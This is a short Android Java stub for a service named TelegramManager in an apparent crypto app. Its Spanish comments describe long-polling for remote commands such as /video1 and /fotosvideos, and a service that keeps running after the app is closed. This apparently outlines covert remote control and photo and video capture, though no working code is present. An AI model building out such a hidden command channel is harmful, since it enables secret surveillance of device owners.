package com.coincrypto.app.service;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;

public class TelegramManager extends Service {
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Implementación de long-polling y recepción de comandos:
        // /activ, /video1, /video2, /fotosvideos, /reciclaje
        return START_STICKY; // Se mantiene en ejecución incluso si la app se cierra
    }
}